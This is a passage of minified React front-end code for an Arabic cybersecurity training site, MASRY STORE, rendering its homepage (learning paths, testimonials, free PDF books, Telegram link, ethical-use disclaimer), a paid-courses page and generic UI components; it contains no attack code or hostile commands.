والاستجابة"},{icon:Vp,title:"SOC Analyst",color:"text-yellow-500",bg:"bg-yellow-500/10",border:"border-yellow-500/20",desc:"محلل مركز العمليات الأمنية"},{icon:Qp,title:"GRC",color:"text-purple-500",bg:"bg-purple-500/10",border:"border-purple-500/20",desc:"الحوكمة وإدارة المخاطر"},{icon:Jp,title:"Forensics",color:"text-cyan-500",bg:"bg-cyan-500/10",border:"border-cyan-500/20",desc:"التحليل الجنائي الرقمي"},{icon:Yp,title:"Malware",color:"text-orange-500",bg:"bg-orange-500/10",border:"border-orange-500/20",desc:"تحليل البرمجيات الخبيثة"},{icon:Xp,title:"أساسيات",color:"text-neon",bg:"bg-neon/10",border:"border-neon/20",desc:"مسار عام للمبتدئين"}],pv=[{quote:"أقوى محتوى عربي في الأمن السيبراني. الخطط التعليمية PDF غيرت طريقة تعلمي. المحتوى منظم وممتاز.",name:"أحمد ك.",role:"مهندس أمن",avatar:"AK"},{quote:"الدعم عبر التليجرام ممتاز، والمناهج منظمة وجاهزة للطباعة. شكراً MASRY STORE على هذا الجهد الرائع.",name:"سلمى ر.",role:"محللة أمنية",avatar:"SR"},{quote:"من أفضل المنصات العربية في مجال الأمن السيبراني. المحتوى العملي والمشاريع الحقيقية غيرت مسار مهنتي.",name:"محمد ع.",role:"مختبر اختراق",avatar:"MO"}];function mv(){return i.jsxs(xl,{"code-path":"src/pages/Home.tsx:75:5",children:[i.jsxs("section",{"code-path":"src/pages/Home.tsx:77:7",className:"min-h-screen flex items-center justify-center text-center relative overflow-hidden bg-black",children:[i.jsx(F0,{"code-path":"src/pages/Home.tsx:78:9",opacity:.18}),i.jsx("div",{"code-path":"src/pages/Home.tsx:79:9",className:"absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-background/95 z-[1]"}),i.jsxs("div",{"code-path":"src/pages/Home.tsx:80:9",className:"relative z-10 max-w-4xl mx-auto px-4",children:[i.jsx(be,{"code-path":"src/pages/Home.tsx:81:11",delay:0,children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:82:13",className:"inline-flex items-center gap-2 px-4 py-2 rounded-full border border-neon/30 bg-neon/5 mb-6 backdrop-blur-sm",children:[i.jsx(Zl,{"code-path":"src/pages/Home.tsx:83:15",className:"w-4 h-4 text-neon"}),i.jsx("span",{"code-path":"src/pages/Home.tsx:84:15",className:"text-neon text-sm font-semibold",children:"منصة الأمن السيبراني العربية #1"})]})}),i.jsx(be,{"code-path":"src/pages/Home.tsx:90:11",delay:150,children:i.jsxs("h1",{"code-path":"src/pages/Home.tsx:91:13",className:"neon-glow-text leading-tight mb-6",children:["أمن سيبراني",i.jsx("br",{"code-path":"src/pages/Home.tsx:93:15"}),i.jsx("span",{"code-path":"src/pages/Home.tsx:94:15",className:"gradient-text",children:"بمنهجية النخبة"})]})}),i.jsx(be,{"code-path":"src/pages/Home.tsx:98:11",delay:300,children:i.jsx("div",{"code-path":"src/pages/Home.tsx:99:13",className:"text-lg sm:text-xl text-gray-300 mb-8 max-w-2xl mx-auto leading-relaxed h-[3em]",children:i.jsx(dv,{"code-path":"src/pages/Home.tsx:100:15",text:"تدريب احترافي، خطط تعليمية مجانية PDF، ومجتمع تليجرام نشط",speed:50,delay:800})})}),i.jsx(be,{"code-path":"src/pages/Home.tsx:108:11",delay:500,children:i.jsx("p",{"code-path":"src/pages/Home.tsx:109:13",className:"text-gray-400 mb-8 max-w-xl mx-auto",children:"انطلق من الصفر حتى الاحتراف في عالم الأمن السيبراني."})}),i.jsx(be,{"code-path":"src/pages/Home.tsx:114:11",delay:650,children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:115:13",className:"flex flex-col sm:flex-row gap-4 justify-center",children:[i.jsxs(at,{"code-path":"src/pages/Home.tsx:116:15",to:"/learning-paths",className:"inline-flex items-center justify-center gap-2 bg-neon text-black font-extrabold px-8 py-4 rounded-full shadow-neon hover:shadow-neon-lg hover:scale-105 transition-all duration-300",children:[i.jsx(ls,{"code-path":"src/pages/Home.tsx:120:17",className:"w-5 h-5"}),"استكشف الخطط المجانية"]}),i.jsxs(at,{"code-path":"src/pages/Home.tsx:123:15",to:"/courses",className:"inline-flex items-center justify-center gap-2 bg-transparent border-2 border-neon text-neon font-bold px-8 py-4 rounded-full hover:bg-neon/10 transition-all duration-300",children:[i.jsx(Kl,{"code-path":"src/pages/Home.tsx:127:17",className:"w-5 h-5"}),"الدورات الاحترافية"]})]})})]})]}),i.jsx(uv,{"code-path":"src/pages/Home.tsx:136:7"}),i.jsx(ev,{"code-path":"src/pages/Home.tsx:139:7"}),i.jsxs("section",{"code-path":"src/pages/Home.tsx:142:7",className:"py-24 px-4 bg-cyber-surface/50 relative overflow-hidden",children:[i.jsxs("div",{"code-path":"src/pages/Home.tsx:143:9",className:"absolute inset-0 opacity-5",children:[i.jsx("div",{"code-path":"src/pages/Home.tsx:144:11",className:"absolute top-10 right-10 w-72 h-72 bg-neon rounded-full blur-[150px]"}),i.jsx("div",{"code-path":"src/pages/Home.tsx:145:11",className:"absolute bottom-10 left-10 w-72 h-72 bg-neon rounded-full blur-[150px]"})]}),i.jsxs("div",{"code-path":"src/pages/Home.tsx:147:9",className:"max-w-6xl mx-auto relative",children:[i.jsx(be,{"code-path":"src/pages/Home.tsx:148:11",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:149:13",className:"text-center mb-16",children:[i.jsx("span",{"code-path":"src/pages/Home.tsx:150:15",className:"text-neon text-sm font-semibold mb-2 block",children:"لماذا نحن؟"}),i.jsxs("h2",{"code-path":"src/pages/Home.tsx:151:15",className:"text-3xl sm:text-5xl font-bold",children:["لماذا ",i.jsx("span",{"code-path":"src/pages/Home.tsx:152:23",className:"neon-text",children:"MASRY STORE"}),"؟"]})]})}),i.jsx("div",{"code-path":"src/pages/Home.tsx:156:11",className:"grid grid-cols-1 md:grid-cols-3 gap-6",children:fv.map((o,u)=>i.jsx(be,{"code-path":"src/pages/Home.tsx:158:15",delay:u*200,children:i.jsx(pl,{"code-path":"src/pages/Home.tsx:159:17",className:`bg-gradient-to-br ${o.color} ${o.borderColor} border backdrop-blur rounded-3xl transition-all duration-300 hover:-translate-y-3 hover:border-neon/40 hover:shadow-neon h-full`,children:i.jsxs(ml,{"code-path":"src/pages/Home.tsx:160:19",className:"p-8 text-center",children:[i.jsx("div",{"code-path":"src/pages/Home.tsx:161:21",className:`w-16 h-16 rounded-2xl ${o.bg} border ${o.borderColor} flex items-center justify-center mx-auto mb-5`,children:i.jsx(o.icon,{"code-path":"src/pages/Home.tsx:162:23",className:`w-8 h-8 ${o.icon===Zl?"text-green-400":o.icon===Kp?"text-cyan-400":"text-purple-400"}`})}),i.jsx("h3",{"code-path":"src/pages/Home.tsx:164:21",className:"text-xl font-bold mb-3",children:o.title}),i.jsx("p",{"code-path":"src/pages/Home.tsx:165:21",className:"text-muted-foreground text-sm leading-relaxed",children:o.desc})]})})},u))})]})]}),i.jsx("section",{"code-path":"src/pages/Home.tsx:177:7",className:"py-24 px-4 relative",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:178:9",className:"max-w-6xl mx-auto",children:[i.jsx(be,{"code-path":"src/pages/Home.tsx:179:11",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:180:13",className:"text-center mb-16",children:[i.jsx("span",{"code-path":"src/pages/Home.tsx:181:15",className:"text-neon text-sm font-semibold mb-2 block",children:"المسارات"}),i.jsx("h2",{"code-path":"src/pages/Home.tsx:182:15",className:"text-3xl sm:text-5xl font-bold mb-4 gradient-text",children:"الخطط التعليمية المتخصصة"}),i.jsx("p",{"code-path":"src/pages/Home.tsx:185:15",className:"text-muted-foreground max-w-2xl mx-auto",children:"7 مسارات تعليمية شاملة، كل مسار يحتوي على منهج كامل من الصفر حتى الاحتراف"})]})}),i.jsx("div",{"code-path":"src/pages/Home.tsx:191:11",className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4",children:hv.map((o,u)=>i.jsx(be,{"code-path":"src/pages/Home.tsx:193:15",delay:u*100,children:i.jsxs(at,{"code-path":"src/pages/Home.tsx:194:17",to:"/learning-paths",className:`${o.bg} ${o.border} border backdrop-blur rounded-3xl p-6 text-center transition-all duration-300 hover:-translate-y-2 hover:border-neon/50 group block`,children:[i.jsx("div",{"code-path":"src/pages/Home.tsx:198:19",className:`w-14 h-14 rounded-xl ${o.bg} border ${o.border} flex items-center justify-center mx-auto mb-4 group-hover:scale-110 transition-transform`,children:i.jsx(o.icon,{"code-path":"src/pages/Home.tsx:199:21",className:`w-7 h-7 ${o.color}`})}),i.jsx("h3",{"code-path":"src/pages/Home.tsx:201:19",className:"font-bold text-lg mb-1 group-hover:text-neon transition-colors",children:o.title}),i.jsx("p",{"code-path":"src/pages/Home.tsx:202:19",className:"text-muted-foreground text-xs",children:o.desc})]})},u))}),i.jsx("div",{"code-path":"src/pages/Home.tsx:208:11",className:"text-center mt-10",children:i.jsxs(at,{"code-path":"src/pages/Home.tsx:209:13",to:"/learning-paths",className:"inline-flex items-center gap-2 bg-neon/10 hover:bg-neon/20 border border-neon/30 text-neon font-bold px-6 py-3 rounded-full transition-all hover:scale-105",children:["عرض جميع المسارات",i.jsx("i",{"code-path":"src/pages/Home.tsx:214:15",className:"fas fa-arrow-left"})]})})]})}),i.jsx("section",{"code-path":"src/pages/Home.tsx:221:7",className:"py-24 px-4 bg-cyber-surface/50",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:222:9",className:"max-w-6xl mx-auto",children:[i.jsx(be,{"code-path":"src/pages/Home.tsx:223:11",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:224:13",className:"text-center mb-16",children:[i.jsx("span",{"code-path":"src/pages/Home.tsx:225:15",className:"text-neon text-sm font-semibold mb-2 block",children:"المكتبة"}),i.jsx("h2",{"code-path":"src/pages/Home.tsx:226:15",className:"text-3xl sm:text-5xl font-bold mb-4 gradient-text",children:"كتب التعليمية المجانية PDF"}),i.jsx("p",{"code-path":"src/pages/Home.tsx:229:15",className:"text-muted-foreground max-w-2xl mx-auto",children:"7 كتب تعليمية شاملة، كل كتاب يحتوي على +200 صفحة من الصفر حتى الاحتراف - تحميل مجاني"})]})}),i.jsx("div",{"code-path":"src/pages/Home.tsx:235:11",className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4",children:Ql.map((o,u)=>i.jsx(be,{"code-path":"src/pages/Home.tsx:237:15",delay:u*100,children:i.jsx(pl,{"code-path":"src/pages/Home.tsx:238:17",className:"glass-card rounded-3xl overflow-hidden transition-all duration-300 hover:-translate-y-2 hover:border-neon/50 group",children:i.jsxs(ml,{"code-path":"src/pages/Home.tsx:239:19",className:"p-6",children:[i.jsxs("div",{"code-path":"src/pages/Home.tsx:240:21",className:"flex items-center gap-3 mb-4",children:[i.jsx("span",{"code-path":"src/pages/Home.tsx:241:23",className:"text-4xl",children:o.emoji}),i.jsxs("div",{"code-path":"src/pages/Home.tsx:242:23",children:[i.jsx("h3",{"code-path":"src/pages/Home.tsx:243:25",className:"font-bold text-lg group-hover:text-neon transition-colors",children:o.title}),i.jsx("p",{"code-path":"src/pages/Home.tsx:244:25",className:"text-xs text-muted-foreground",children:o.level})]})]}),i.jsx("p",{"code-path":"src/pages/Home.tsx:247:21",className:"text-sm text-muted-foreground mb-4 line-clamp-2",children:o.description}),i.jsxs("div",{"code-path":"src/pages/Home.tsx:250:21",className:"flex items-center justify-between",children:[i.jsxs("span",{"code-path":"src/pages/Home.tsx:251:23",className:"text-xs text-muted-foreground flex items-center gap-1",children:[i.jsx(Kl,{"code-path":"src/pages/Home.tsx:252:25",className:"w-3 h-3 text-neon/60"}),o.chapters.length," فصل"]}),i.jsxs("a",{"code-path":"src/pages/Home.tsx:255:23",href:`/pdfs/${o.id}.pdf`,download:!0,className:"inline-flex items-center gap-1.5 bg-neon/10 hover:bg-neon/20 border border-neon/30 text-neon px-3 py-1.5 rounded-full text-xs font-semibold transition-all hover:scale-105",children:[i.jsx(Rc,{"code-path":"src/pages/Home.tsx:260:25",className:"w-3 h-3"}),"تحميل PDF"]})]})]})})},o.id))})]})}),i.jsx("section",{"code-path":"src/pages/Home.tsx:273:7",className:"py-24 px-4",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:274:9",className:"max-w-5xl mx-auto",children:[i.jsx(be,{"code-path":"src/pages/Home.tsx:275:11",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:276:13",className:"text-center mb-16",children:[i.jsx("span",{"code-path":"src/pages/Home.tsx:277:15",className:"text-neon text-sm font-semibold mb-2 block",children:"الآراء"}),i.jsx("h2",{"code-path":"src/pages/Home.tsx:278:15",className:"text-3xl sm:text-5xl font-bold gradient-text",children:"آراء المتدربين"})]})}),i.jsx("div",{"code-path":"src/pages/Home.tsx:284:11",className:"grid grid-cols-1 md:grid-cols-3 gap-6",children:pv.map((o,u)=>i.jsx(be,{"code-path":"src/pages/Home.tsx:286:15",delay:u*150,children:i.jsx(pl,{"code-path":"src/pages/Home.tsx:287:17",className:"bg-cyber-elevated/80 backdrop-blur border-r-4 border-neon rounded-3xl relative h-full",children:i.jsxs(ml,{"code-path":"src/pages/Home.tsx:288:19",className:"p-8",children:[i.jsx("i",{"code-path":"src/pages/Home.tsx:289:21",className:"fas fa-quote-right text-neon/20 text-4xl absolute top-4 right-4"}),i.jsxs("div",{"code-path":"src/pages/Home.tsx:290:21",className:"mb-6 flex items-center gap-3 relative z-10",children:[i.jsx("div",{"code-path":"src/pages/Home.tsx:291:23",className:"w-12 h-12 rounded-full bg-neon/20 border border-neon/30 flex items-center justify-center text-neon font-bold",children:o.avatar}),i.jsxs("div",{"code-path":"src/pages/Home.tsx:294:23",children:[i.jsx("div",{"code-path":"src/pages/Home.tsx:295:25",className:"font-bold",children:o.name}),i.jsx("div",{"code-path":"src/pages/Home.tsx:296:25",className:"text-xs text-muted-foreground",children:o.role})]})]}),i.jsxs("p",{"code-path":"src/pages/Home.tsx:299:21",className:"text-foreground/80 leading-relaxed text-sm",children:['"',o.quote,'"']}),i.jsx("div",{"code-path":"src/pages/Home.tsx:302:21",className:"flex gap-1 mt-4",children:[...Array(5)].map((d,r)=>i.jsx("i",{"code-path":"src/pages/Home.tsx:304:25",className:"fas fa-star text-neon text-xs"},r))})]})})},u))})]})}),i.jsxs("section",{"code-path":"src/pages/Home.tsx:316:7",className:"py-20 px-4 border-y border-neon/30 bg-gradient-to-r from-cyber-bg via-cyber-surface to-cyber-bg relative overflow-hidden",children:[i.jsx("div",{"code-path":"src/pages/Home.tsx:317:9",className:"absolute inset-0 opacity-10",children:i.jsx("div",{"code-path":"src/pages/Home.tsx:318:11",className:"absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-[#0088cc] rounded-full blur-[150px]"})}),i.jsx("div",{"code-path":"src/pages/Home.tsx:320:9",className:"max-w-3xl mx-auto text-center relative",children:i.jsxs(be,{"code-path":"src/pages/Home.tsx:321:11",children:[i.jsx("div",{"code-path":"src/pages/Home.tsx:322:13",className:"w-16 h-16 rounded-2xl bg-[#0088cc]/20 border border-[#0088cc]/30 flex items-center justify-center mx-auto mb-6",children:i.jsx("i",{"code-path":"src/pages/Home.tsx:323:15",className:"fab fa-telegram-plane text-[#0088cc] text-3xl"})}),i.jsx("h2",{"code-path":"src/pages/Home.tsx:325:13",className:"text-2xl sm:text-4xl font-bold mb-4",children:"انضم إلى مجتمع التليجرام الرسمي"}),i.jsx("p",{"code-path":"src/pages/Home.tsx:328:13",className:"text-muted-foreground mb-8 max-w-xl mx-auto",children:"جميع المناقشات، الملفات، والدعم المباشر تتم هناك. لا واتساب، فقط تليجرام."}),i.jsxs("a",{"code-path":"src/pages/Home.tsx:331:13",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"inline-flex items-center gap-2 bg-[#0088cc] hover:bg-[#00aaff] text-white font-bold px-8 py-4 rounded-full transition-all duration-300 hover:scale-105 shadow-lg shadow-[#0088cc]/20",children:[i.jsx("i",{"code-path":"src/pages/Home.tsx:337:15",className:"fab fa-telegram-plane text-xl"}),"انضم إلى المجموعة الأساسية"]})]})})]}),i.jsx("section",{"code-path":"src/pages/Home.tsx:345:7",className:"py-12 px-4",children:i.jsx("div",{"code-path":"src/pages/Home.tsx:346:9",className:"max-w-4xl mx-auto",children:i.jsx(be,{"code-path":"src/pages/Home.tsx:347:11",children:i.jsxs("div",{"code-path":"src/pages/Home.tsx:348:13",className:"warning-box text-center",children:[i.jsxs("h3",{"code-path":"src/pages/Home.tsx:349:15",className:"text-red-400 font-bold text-lg mb-2",children:[i.jsx("i",{"code-path":"src/pages/Home.tsx:350:17",className:"fas fa-exclamation-triangle ml-2"}),"تنويه قانوني"]}),i.jsx("p",{"code-path":"src/pages/Home.tsx:353:15",className:"text-foreground/80 text-sm",children:"جميع المواد التعليمية مخصصة للهكر الأخلاقي واختبار الاختراق بإذن فقط. أي استخدام غير قانوني يتحمل المستخدم مسؤوليته بالكامل. MASRY STORE غير مسؤول عن سوء الاستخدام."})]})})})})]})}function ap(o,u){if(typeof o=="function")return o(u);o!=null&&(o.current=u)}function gv(...o){return u=>{let d=!1;const r=o.map(f=>{const p=ap(f,u);return!d&&typeof p=="function"&&(d=!0),p});if(d)return()=>{for(let f=0;f<r.length;f++){const p=r[f];typeof p=="function"?p():ap(o[f],null)}}}}var xv=Symbol.for("react.lazy"),ko=Rx[" use ".trim().toString()];function bv(o){return typeof o=="object"&&o!==null&&"then"in o}function Wp(o){return o!=null&&typeof o=="object"&&"$$typeof"in o&&o.$$typeof===xv&&"_payload"in o&&bv(o._payload)}function vv(o){const u=yv(o),d=N.forwardRef((r,f)=>{let{children:p,...x}=r;Wp(p)&&typeof ko=="function"&&(p=ko(p._payload));const v=N.Children.toArray(p),g=v.find(Av);if(g){const m=g.props.children,T=v.map(A=>A===g?N.Children.count(m)>1?N.Children.only(null):N.isValidElement(m)?m.props.children:null:A);return i.jsx(u,{...x,ref:f,children:N.isValidElement(m)?N.cloneElement(m,void 0,T):null})}return i.jsx(u,{...x,ref:f,children:p})});return d.displayName=`${o}.Slot`,d}var Fp=vv("Slot");function yv(o){const u=N.forwardRef((d,r)=>{let{children:f,...p}=d;if(Wp(f)&&typeof ko=="function"&&(f=ko(f._payload)),N.isValidElement(f)){const x=Ev(f),v=Tv(p,f.props);return f.type!==N.Fragment&&(v.ref=r?gv(r,x):x),N.cloneElement(f,v)}return N.Children.count(f)>1?N.Children.only(null):null});return u.displayName=`${o}.SlotClone`,u}var Sv=Symbol("radix.slottable");function Av(o){return N.isValidElement(o)&&typeof o.type=="function"&&"__radixId"in o.type&&o.type.__radixId===Sv}function Tv(o,u){const d={...u};for(const r in u){const f=o[r],p=u[r];/^on[A-Z]/.test(r)?f&&p?d[r]=(...v)=>{const g=p(...v);return f(...v),g}:f&&(d[r]=f):r==="style"?d[r]={...f,...p}:r==="className"&&(d[r]=[f,p].filter(Boolean).join(" "))}return{...o,...d}}function Ev(o){let u=Object.getOwnPropertyDescriptor(o.props,"ref")?.get,d=u&&"isReactWarning"in u&&u.isReactWarning;return d?o.ref:(u=Object.getOwnPropertyDescriptor(o,"ref")?.get,d=u&&"isReactWarning"in u&&u.isReactWarning,d?o.props.ref:o.props.ref||o.ref)}const np=o=>typeof o=="boolean"?`${o}`:o===0?"0":o,sp=wp,Ip=(o,u)=>d=>{var r;if(u?.variants==null)return sp(o,d?.class,d?.className);const{variants:f,defaultVariants:p}=u,x=Object.keys(f).map(m=>{const T=d?.[m],A=p?.[m];if(T===null)return null;const z=np(T)||np(A);return f[m][z]}),v=d&&Object.entries(d).reduce((m,T)=>{let[A,z]=T;return z===void 0||(m[A]=z),m},{}),g=u==null||(r=u.compoundVariants)===null||r===void 0?void 0:r.reduce((m,T)=>{let{class:A,className:z,...V}=T;return Object.entries(V).every(q=>{let[L,H]=q;return Array.isArray(H)?H.includes({...p,...v}[L]):{...p,...v}[L]===H})?[...m,A,z]:m},[]);return sp(o,x,g,d?.class,d?.className)},Nv=Ip("inline-flex items-center justify-center rounded-full border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&>svg]:size-3 gap-1 [&>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden",{variants:{variant:{default:"border-transparent bg-primary text-primary-foreground [a&]:hover:bg-primary/90",secondary:"border-transparent bg-secondary text-secondary-foreground [a&]:hover:bg-secondary/90",destructive:"border-transparent bg-destructive text-white [a&]:hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60",outline:"text-foreground [a&]:hover:bg-accent [a&]:hover:text-accent-foreground"}},defaultVariants:{variant:"default"}});function ma({className:o,variant:u,asChild:d=!1,...r}){const f=d?Fp:"span";return i.jsx(f,{"code-path":"src/components/ui/badge.tsx:38:5","data-slot":"badge",className:rs(Nv({variant:u}),o),...r})}const jv=[{tag:"أمن بنية تحتية",title:"Red Hat Mastery",icon:Zl,iconColor:"text-red-500",bg:"from-red-500/10 to-red-900/10",border:"border-red-500/20",desc:"إدارة وتأمين خوادم لينكس، اكتشاف الثغرات، تحصين الشبكات ضد الاختراقات.",features:["تأمين الخوادم ضد الهجمات","مراقبة الشبكات واكتشاف الدخول غير المصرح به","مشاريع عملية لمحاكاة بيئات الشركات"],price:"299 ج.م",originalPrice:"499 ج.م",students:120,duration:"8 أسابيع"},{tag:"أتمتة أمنية",title:"BOTs Development",icon:b0,iconColor:"text-cyan-500",bg:"from-cyan-500/10 to-cyan-900/10",border:"border-cyan-500/20",desc:"بناء أدوات أتمتة لتحليل البيانات واختبار الاختراق القانوني باستخدام Python.",features:["أتمتة مهام الأمن السيبراني","تطوير بوتات لفحص الثغرات","برمجة موجهة للأداء والدقة"],price:"399 ج.م",originalPrice:"599 ج.م",students:85,duration:"10 أسابيع"},{tag:"استخبارات",title:"Dark Web Insights",icon:Pp,iconColor:"text-purple-500",bg:"from-purple-500/10 to-purple-900/10",border:"border-purple-500/20",desc:"تحليل تور، تشفير، وأدوات التحليل الجنائي للويب المظلم واستخبارات المصادر المفتوحة.",features:["تحليل شبكة Tor وتقنيات الإخفاء","أدوات التحليل الجنائي الرقمي","استخبارات مكافحة الجريمة الإلكترونية"],price:"499 ج.م",originalPrice:"799 ج.م",students:64,duration:"12 أسبوع"}];function Cv(){return i.jsxs(xl,{"code-path":"src/pages/Courses.tsx:69:5",children:[i.jsxs("section",{"code-path":"src/pages/Courses.tsx:71:7",className:"relative py-20 px-4 overflow-hidden bg-cyber-surface/30",children:[i.jsx("div",{"code-path":"src/pages/Courses.tsx:72:9",className:"absolute inset-0 opacity-5",children:i.jsx("div",{"code-path":"src/pages/Courses.tsx:73:11",className:"absolute top-0 left-1/3 w-96 h-96 bg-neon rounded-full blur-[200px]"})}),i.jsx("div",{"code-path":"src/pages/Courses.tsx:75:9",className:"max-w-5xl mx-auto relative text-center",children:i.jsxs(be,{"code-path":"src/pages/Courses.tsx:76:11",children:[i.jsxs("div",{"code-path":"src/pages/Courses.tsx:77:13",className:"inline-flex items-center gap-2 px-4 py-2 rounded-full border border-neon/30 bg-neon/5 mb-6",children:[i.jsx(Uo,{"code-path":"src/pages/Courses.tsx:78:15",className:"w-4 h-4 text-neon"}),i.jsx("span",{"code-path":"src/pages/Courses.tsx:79:15",className:"text-neon text-sm font-semibold",children:"تدريب احترافي"})]}),i.jsx("h1",{"code-path":"src/pages/Courses.tsx:81:13",className:"neon-glow-text text-4xl sm:text-5xl mb-4",children:"الدورات الاحترافية"}),i.jsx("p",{"code-path":"src/pages/Courses.tsx:82:13",className:"text-muted-foreground max-w-2xl mx-auto text-lg leading-relaxed",children:"تدريب عملي معتمد - الدفع والتواصل عبر التليجرام فقط. احصل على شهادة إتمام بعد كل كورس."})]})})]}),i.jsx("section",{"code-path":"src/pages/Courses.tsx:90:7",className:"py-16 px-4",children:i.jsxs("div",{"code-path":"src/pages/Courses.tsx:91:9",className:"max-w-6xl mx-auto",children:[i.jsx("div",{"code-path":"src/pages/Courses.tsx:92:11",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",children:jv.map((o,u)=>i.jsx(be,{"code-path":"src/pages/Courses.tsx:94:15",delay:u*150,children:i.jsx(pl,{"code-path":"src/pages/Courses.tsx:95:17",className:`bg-gradient-to-br ${o.bg} ${o.border} border backdrop-blur rounded-3xl overflow-hidden transition-all duration-300 hover:-translate-y-3 hover:border-neon/50 h-full`,children:i.jsxs(ml,{"code-path":"src/pages/Courses.tsx:99:19",className:"p-6 flex flex-col h-full",children:[i.jsx("div",{"code-path":"src/pages/Courses.tsx:100:21",className:`w-14 h-14 rounded-2xl ${o.bg} border ${o.border} flex items-center justify-center mb-4`,children:i.jsx(o.icon,{"code-path":"src/pages/Courses.tsx:101:23",className:`w-7 h-7 ${o.iconColor}`})}),i.jsx(ma,{"code-path":"src/pages/Courses.tsx:104:21",className:"bg-neon text-black font-extrabold text-xs mb-3 w-fit hover:bg-neon",children:o.tag}),i.jsx("h2",{"code-path":"src/pages/Courses.tsx:108:21",className:"text-2xl font-bold mb-3",children:o.title}),i.jsx("p",{"code-path":"src/pages/Courses.tsx:110:21",className:"text-muted-foreground text-sm mb-4 leading-relaxed flex-1",children:o.desc}),i.jsx("ul",{"code-path":"src/pages/Courses.tsx:114:21",className:"space-y-2 mb-6",children:o.features.map((d,r)=>i.jsxs("li",{"code-path":"src/pages/Courses.tsx:116:25",className:"flex items-start gap-2 text-sm",children:[i.jsx(xc,{"code-path":"src/pages/Courses.tsx:117:27",className:"w-4 h-4 text-neon mt-0.5 shrink-0"}),i.jsx("span",{"code-path":"src/pages/Courses.tsx:118:27",className:"text-foreground/80",children:d})]},r))}),i.jsxs("div",{"code-path":"src/pages/Courses.tsx:123:21",className:"flex items-center gap-4 text-xs text-muted-foreground mb-4",children:[i.jsxs("span",{"code-path":"src/pages/Courses.tsx:124:23",className:"flex items-center gap-1",children:[i.jsx(Zp,{"code-path":"src/pages/Courses.tsx:125:25",className:"w-3 h-3"}),o.students]}),i.jsxs("span",{"code-path":"src/pages/Courses.tsx:128:23",className:"flex items-center gap-1",children:[i.jsx(ns,{"code-path":"src/pages/Courses.tsx:129:25",className:"w-3 h-3"}),o.duration]}),i.jsxs("span",{"code-path":"src/pages/Courses.tsx:132:23",className:"flex items-center gap-1",children:[i.jsx(q0,{"code-path":"src/pages/Courses.tsx:133:25",className:"w-3 h-3 text-neon"}),"4.9"]})]}),i.jsxs("div",{"code-path":"src/pages/Courses.tsx:138:21",className:"flex items-center gap-3 mb-4",children:[i.jsx("span",{"code-path":"src/pages/Courses.tsx:139:23",className:"text-neon text-2xl font-black",children:o.price}),i.jsx("span",{"code-path":"src/pages/Courses.tsx:140:23",className:"text-muted-foreground line-through text-sm",children:o.originalPrice}),i.jsx(ma,{"code-path":"src/pages/Courses.tsx:141:23",className:"bg-red-500/20 text-red-400 border-red-500/30 text-xs",children:"خصم"})]}),i.jsxs("a",{"code-path":"src/pages/Courses.tsx:146:21",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"block w-full text-center bg-[#0088cc] hover:bg-[#00aaff] text-white font-bold py-3 rounded-full transition-all duration-200 hover:scale-105",children:[i.jsx("i",{"code-path":"src/pages/Courses.tsx:152:23",className:"fab fa-telegram-plane ml-2"}),"شراء عبر التليجرام"]})]})})},u))}),i.jsxs("div",{"code-path":"src/pages/Courses.tsx:161:11",className:"note-box mt-10 text-center max-w-3xl mx-auto",children:[i.jsx("i",{"code-path":"src/pages/Courses.tsx:162:13",className:"fab fa-telegram-plane text-neon text-xl mb-2 block"}),i.jsxs("p",{"code-path":"src/pages/Courses.tsx:163:13",className:"text-sm text-foreground/80",children:["بعد إتمام عملية الشراء عبر التليجرام، سيتم تفعيل حسابك وستحصل على رابط المحتوى الكامل وشهادة الإتمام."," ",i.jsx("a",{"code-path":"src/pages/Courses.tsx:165:15",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline font-semibold",children:"انقر هنا للتواصل"})]})]}),i.jsx("div",{"code-path":"src/pages/Courses.tsx:171:11",className:"text-center mt-8",children:i.jsxs(at,{"code-path":"src/pages/Courses.tsx:172:13",to:"/learning-paths",className:"inline-flex items-center gap-2 text-neon font-bold hover:underline",children:["أو استكشف خططنا التعليمية المجانية",i.jsx("i",{"code-path":"src/pages/Courses.tsx:177:15",className:"fas fa-arrow-left"})]})})]})})]})}function $p({className:o,type:u,...d}){return i.jsx("input",{"code-path":"src/components/ui/input.tsx:7:5",type:u,"data-slot":"input",className:rs("file:text-foreground placeholder:text-muted-foreground selection:bg-primary selection:text-primary-foreground dark:bg-input/30 border-input h-9 w-full min-w-0 rounded-md border bg-transparent px-3 py-1 text-base shadow-xs transition-[color,box-shadow] outline-none file:inline-flex file:h-7 file:border-0 file:bg-transparent file:text-sm file:font-medium disabled:pointer-events-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm","focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px]","aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive",o),...d})}const 